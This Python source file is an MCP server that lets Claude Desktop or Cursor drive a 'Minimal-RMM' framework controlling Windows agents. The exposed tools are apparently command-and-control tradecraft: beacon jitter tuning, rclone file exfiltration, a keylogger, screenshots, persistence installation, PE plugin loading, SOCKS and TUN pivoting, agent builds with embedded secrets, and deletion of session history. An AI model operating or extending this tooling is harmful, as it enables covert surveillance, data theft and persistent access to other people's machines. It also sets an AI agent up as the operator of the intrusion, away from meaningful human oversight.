#!/usr/bin/env python3
"""
MCP server for Minimal-RMM — exposes operator API tools to Claude Desktop / Cursor.

Environment:
  RMM_SERVER_URL / RMM_BASE_URL  — RMM server base URL
  RMM_API_TOKEN                  — operator API token
  RMM_WORKSPACE_ID / RMM_WORKSPACE_TOKEN — optional scoped workspace credentials

Run:
  pip install mcp
  python mcp_rmm_server.py

Cursor MCP config (~/.cursor/mcp.json):
  {
    "mcpServers": {
      "minimal-rmm": {
        "command": "python",
        "args": ["/path/to/Minimal-RMM/mcp_rmm_server.py"],
        "env": {
          "RMM_SERVER_URL": "http://127.0.0.1:8080",
          "RMM_API_TOKEN": "your-token"
        }
      }
    }
  }
"""

from __future__ import annotations

from rmm_settings import bootstrap, getenv as settings_getenv

if __name__ == "__main__":
    bootstrap("client")

from mcp.server.fastmcp import FastMCP

from rmm_tools import (
    make_client,
    tool_settings,
    tool_embedding_profiles,
    tool_embedding_results,
    tool_run_embeddings,
    tool_delete_history,
    tool_clear_history,
    tool_exec_command,
    tool_get_agent_script,
    tool_deploy_agent_script,
    tool_build_go_agent,
    tool_get_events,
    tool_get_history_events,
    tool_get_history_session,
    tool_get_session,
    tool_health,
    tool_install_persistence,
    tool_kill_session,
    tool_list_history,
    tool_list_artifacts,
    tool_list_session_downloads,
    tool_list_socks,
    tool_list_tun,
    tool_list_sessions,
    tool_patch_config,
    tool_queue_command,
    tool_queue_download,
    tool_queue_exfil,
    tool_get_rclone_config,
    tool_queue_keylog,
    tool_queue_persistent,
    tool_queue_screenshot,
    tool_list_plugins,
    tool_list_plugin_release,
    tool_install_plugin_release,
    tool_list_plugin_sources,
    tool_save_plugin_source,
    tool_remove_plugin_source,
    tool_list_assets,
    tool_add_asset,
    tool_set_asset_enabled,
    tool_remove_asset,
    tool_profile_status,
    tool_start_profile,
    tool_stop_profile,
    tool_queue_pe_load,
    tool_queue_upload,
    tool_remove_persistence,
    tool_start_socks,
    tool_start_tun,
    tool_stop_persistent,
    tool_stop_socks,
    tool_stop_tun,
)

mcp = FastMCP(
    "Minimal RMM",
    instructions=(
        "Control Minimal-RMM Windows agents via the operator REST API. "
        "Use list_sessions to discover hosts; session_ref accepts hostname or id prefix."
    ),
)

_cached_client = None


def _client():
    global _cached_client
    if _cached_client is None:
        _cached_client = make_client(
            settings_getenv("RMM_SERVER_URL") or settings_getenv("RMM_BASE_URL"),
            settings_getenv("RMM_API_TOKEN") or None,
        )
    return _cached_client


@mcp.tool()
def settings(action: str = "show", settings: dict | None = None) -> str:
    """Read redacted service settings or update typed overrides. Null removes an override. Restart required; environment takes precedence. Workspace settings use the local workspace API."""
    return tool_settings(_client(), action, settings)


@mcp.tool()
def embedding_profiles(action: str = "list", name: str = "", config: dict | None = None) -> str:
    """List/get/save/delete embedding profiles, or use action='defaults' for the repository preset. Use the local workspace URL in workspace mode; never include tokens in config."""
    return tool_embedding_profiles(_client(), action, name, config)


@mcp.tool()
def run_embeddings(session_ref: str, profile: str, documents: list[str]) -> str:
    """Queue explicit file or directory paths, including UNC, with a saved embedding profile."""
    return tool_run_embeddings(_client(), session_ref, profile, documents)


@mcp.tool()
def embedding_results(action: str = "list", name: str = "", session_ref: str = "", event_id: int = 0) -> str:
    """List/get/save/delete collections; save selects an exact session output event."""
    return tool_embedding_results(_client(), action, name, session_ref, event_id)


@mcp.tool()
def health() -> str:
    """Check RMM server API health."""
    return tool_health(_client())


@mcp.tool()
def list_sessions() -> str:
    """List all active RMM agent sessions."""
    return tool_list_sessions(_client())


@mcp.tool()
def get_session(session_ref: str) -> str:
    """Get session details by hostname, id prefix, or full UUID."""
    return tool_get_session(_client(), session_ref)


@mcp.tool()
def exec_command(session_ref: str, command: str, timeout: float = 120) -> str:
    """Run a command on the agent and wait for output."""
    return tool_exec_command(_client(), session_ref, command, timeout=timeout)


@mcp.tool()
def queue_command(session_ref: str, command: str, cmd_type: str = "oneshot") -> str:
    """Queue a command for the next agent beacon."""
    return tool_queue_command(_client(), session_ref, command, cmd_type=cmd_type)


@mcp.tool()
def patch_config(
    session_ref: str,
    sleep_seconds: int | None = None,
    jitter_percent: int | None = None,
) -> str:
    """Update beacon sleep interval and/or jitter percent."""
    return tool_patch_config(_client(), session_ref, sleep_seconds, jitter_percent)


@mcp.tool()
def get_events(session_ref: str, since: int = 0, limit: int = 50) -> str:
    """Fetch session event transcript (outputs, operator actions)."""
    return tool_get_events(_client(), session_ref, since=since, limit=limit)


@mcp.tool()
def kill_session(session_ref: str) -> str:
    """Kill an agent session."""
    return tool_kill_session(_client(), session_ref)


@mcp.tool()
def queue_download(session_ref: str, remote_path: str) -> str:
    """Queue remote file download from agent."""
    return tool_queue_download(_client(), session_ref, remote_path)


@mcp.tool()
def queue_exfil(
    session_ref: str,
    remote_path: str,
    profile: str | None = None,
    dest: str | None = None,
    mode: str = "auto",
) -> str:
    """Queue remote file or folder exfil via rclone from the agent (link in events when supported)."""
    return tool_queue_exfil(_client(), session_ref, remote_path, profile, dest, mode)


@mcp.tool()
def get_rclone_config() -> str:
    """Show rclone profiles and binary status on the RMM server."""
    return tool_get_rclone_config(_client())


@mcp.tool()
def queue_screenshot(session_ref: str) -> str:
    """Queue screenshot on agent."""
    return tool_queue_screenshot(_client(), session_ref)


@mcp.tool()
def list_plugins() -> str:
    """List PE plugins available on the RMM server for the Go agent."""
    return tool_list_plugins(_client())


@mcp.tool()
def list_plugin_sources() -> str:
    """List persisted plugin repositories, branches, and credential references."""
    return tool_list_plugin_sources(_client())


@mcp.tool()
def save_plugin_source(source_id: str, repository: str, branch: str = "main", label: str = "", credential_env: str = "RMM_PLUGIN_GITHUB_TOKEN") -> str:
    """Save a repository/branch source using an environment variable name, never a token."""
    return tool_save_plugin_source(_client(), source_id, repository, branch, label, credential_env)


@mcp.tool()
def remove_plugin_source(source_id: str) -> str:
    """Delete source configuration while retaining installed plugins."""
    return tool_remove_plugin_source(_client(), source_id)


@mcp.tool()
def list_plugin_release(tag: str = "latest", source: str = "default") -> str:
    """Inspect a compiled GitHub plugin release and resolve its exact tag."""
    return tool_list_plugin_release(_client(), tag, source)


@mcp.tool()
def install_plugin_release(name: str, tag: str, sha256: str = "", source: str = "default", source_revision: str = "") -> str:
    """Install one verified plugin from an exact release tag without executing it."""
    return tool_install_plugin_release(_client(), name, tag, sha256, source, source_revision)


@mcp.tool()
def list_assets(kind: str = "") -> str:
    """List URL-installed plugins, AI skills, and rclone profile files."""
    return tool_list_assets(_client(), kind)


@mcp.tool()
def add_asset(kind: str, url: str, name: str = "", enabled: bool = True) -> str:
    """Download and install a plugin, AI skill, or rclone file from an HTTP(S) URL."""
    return tool_add_asset(_client(), kind, url, name, enabled)


@mcp.tool()
def set_asset_enabled(kind: str, name: str, enabled: bool) -> str:
    """Enable or disable one managed operator asset."""
    return tool_set_asset_enabled(_client(), kind, name, enabled)


@mcp.tool()
def remove_asset(kind: str, name: str) -> str:
    """Remove one managed operator asset."""
    return tool_remove_asset(_client(), kind, name)


@mcp.tool()
def profile_status() -> str:
    """Show the active RMM-Profile and agent beacon URL."""
    return tool_profile_status(_client())


@mcp.tool()
def start_profile(name: str = "cloudflared", config: dict | None = None) -> str:
    """Start an installed RMM-Profile connector."""
    return tool_start_profile(_client(), name, config)


@mcp.tool()
def stop_profile() -> str:
    """Stop the active RMM-Profile connector."""
    return tool_stop_profile(_client())


@mcp.tool()
def queue_pe_load(
    session_ref: str,
    plugin: str,
    export: str = "Run",
    input: str = "",
    command: str = "",
) -> str:
    """Queue an isolated PE command; Windows-loader DLLs use a temporary file."""
    return tool_queue_pe_load(
        _client(),
        session_ref,
        plugin,
        export=export,
        plugin_input=input,
        plugin_command=command,
    )


@mcp.tool()
def queue_upload(session_ref: str, local_path: str, remote_path: str) -> str:
    """Queue a local file or artifact_ref upload. Success means queued, not delivered. Record the get_events cursor before queuing, then wait for a new successful upload result matching this session and destination before copying, extracting, or executing. Missing results are inconclusive; do not blindly retry."""
    return tool_queue_upload(_client(), session_ref, local_path, remote_path)


@mcp.tool()
def list_socks() -> str:
    """List all active SOCKS5 listeners on the RMM server and their connected agents."""
    return tool_list_socks(_client())


@mcp.tool()
def start_socks(session_ref: str, port: int = 1080, bind_host: str = "127.0.0.1") -> str:
    """Start SOCKS5 on the RMM server; use socks5://bind_host:port from that host."""
    return tool_start_socks(_client(), session_ref, port=port, bind_host=bind_host)


@mcp.tool()
def stop_socks(session_ref: str) -> str:
    """Stop SOCKS5 relay for the session."""
    return tool_stop_socks(_client(), session_ref)


@mcp.tool()
def list_tun() -> str:
    """List active server-side TUN relays configured on the RMM server."""
    return tool_list_tun(_client())


@mcp.tool()
def start_tun(
    session_ref: str,
    device: str,
    route: str = "",
    tun_address: str = "198.18.0.1/15",
    interface: str = "",
    mtu: int = 1500,
    udp_timeout_seconds: int = 300,
    routes: list[str] | None = None,
) -> str:
    """Create a server-side TUN relay whose traffic exits through a Go agent."""
    return tool_start_tun(
        _client(),
        session_ref,
        device,
        route=route,
        routes=routes,
        tun_address=tun_address,
        interface=interface,
        mtu=mtu,
        udp_timeout_seconds=udp_timeout_seconds,
    )


@mcp.tool()
def stop_tun(session_ref: str) -> str:
    """Disable the server-side TUN relay for a session."""
    return tool_stop_tun(_client(), session_ref)


@mcp.tool()
def queue_persistent(session_ref: str, command: str) -> str:
    """Set a persistent command on the agent until stop_persistent."""
    return tool_queue_persistent(_client(), session_ref, command)


@mcp.tool()
def stop_persistent(session_ref: str) -> str:
    """Stop the agent persistent command."""
    return tool_stop_persistent(_client(), session_ref)


@mcp.tool()
def list_history() -> str:
    """List archived (ended) session transcripts."""
    return tool_list_history(_client())


@mcp.tool()
def get_history_session(session_ref: str) -> str:
    """Get metadata for an archived session by id prefix, full id, or hostname."""
    return tool_get_history_session(_client(), session_ref)


@mcp.tool()
def get_history_events(session_ref: str, since: int = 0, limit: int = 500) -> str:
    """Fetch read-only event transcript for an archived session."""
    return tool_get_history_events(_client(), session_ref, since=since, limit=limit)


@mcp.tool()
def delete_history(session_ref: str) -> str:
    """Permanently delete an archived session transcript (ended sessions only)."""
    return tool_delete_history(_client(), session_ref)


@mcp.tool()
def clear_history() -> str:
    """Permanently delete all archived (ended) session transcripts from disk."""
    return tool_clear_history(_client())


@mcp.tool()
def list_session_downloads(session_ref: str) -> str:
    """List files downloaded from the agent for a live session."""
    return tool_list_session_downloads(_client(), session_ref)


@mcp.tool()
def list_artifacts(kind: str = "downloads") -> str:
    """List downloads or screenshots from every agent."""
    return tool_list_artifacts(_client(), kind)


@mcp.tool()
def get_agent_script() -> str:
    """Fetch the full client_rmm.ps1 agent script from the server."""
    return tool_get_agent_script(_client())


@mcp.tool()
def deploy_agent_script(
    session_id: str = "",
    sleep_seconds: int = 60,
    jitter_percent: int = 30,
    http_proxy: str = "",
) -> str:
    """Render a ready-to-run client_rmm.ps1 configured with the active beacon URL and secret; returns a portable artifact_ref for queue_upload."""
    return tool_deploy_agent_script(_client(), session_id, sleep_seconds, jitter_percent, http_proxy)


@mcp.tool()
def build_go_agent(
    goos: str = "windows",
    goarch: str = "amd64",
    session_id: str = "",
    sleep_seconds: int = 60,
    jitter_percent: int = 30,
    http_proxy: str = "",
) -> str:
    """Build the repository Go agent with the active connection settings embedded; returns the ZIP artifact_ref for queue_upload."""
    return tool_build_go_agent(_client(), goos, goarch, session_id, sleep_seconds, jitter_percent, http_proxy)


@mcp.tool()
def queue_keylog(session_ref: str, action: str) -> str:
    """Queue keylogger start, stop, or dump on the agent."""
    return tool_queue_keylog(_client(), session_ref, action)


@mcp.tool()
def install_persistence(session_ref: str) -> str:
    """Queue agent persistence install (lab use only)."""
    return tool_install_persistence(_client(), session_ref)


@mcp.tool()
def remove_persistence(session_ref: str) -> str:
    """Queue agent persistence removal (lab use only)."""
    return tool_remove_persistence(_client(), session_ref)


if __name__ == "__main__":
    mcp.run()
